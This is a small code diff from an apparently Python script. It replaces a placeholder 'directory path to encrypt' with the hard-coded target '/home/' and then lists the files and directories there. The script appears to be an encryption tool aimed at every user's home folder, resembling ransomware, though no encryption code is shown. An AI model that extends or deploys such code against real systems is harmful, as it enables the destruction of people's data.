@@ -25,7 +25,7 @@ def listDirectories(Dirpath):
 
 
 if opt == 1:
-    path = "directory path to encrypt (full path works better /home/kali/Documents/)" # Remember to put a / at the end
+    path = "/home/" # Remember to put a / at the end
     files = []
     directories = []
     listagem = (os.listdir(path))
